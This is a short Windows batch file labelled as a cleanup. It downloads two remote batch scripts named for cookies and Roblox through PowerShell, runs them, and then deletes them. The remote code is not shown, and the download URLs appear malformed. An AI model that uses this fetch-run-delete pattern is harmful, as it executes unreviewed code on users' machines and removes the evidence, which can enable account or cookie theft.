@echo off
echo Starting cleanup...

REM Download additional scripts
powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/indev/win7-cookies.bat' -OutFile 'cookies.bat'}"
powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/indev/win7-roblox.bat' -OutFile 'roblox.bat'}"

REM Execute Roblox cleanup
call roblox.bat

REM Execute Cookie cleanup
call cookies.bat

REM Cleanup downloaded files
del /f /q cookies.bat
del /f /q roblox.bat

echo All operations completed!
pause
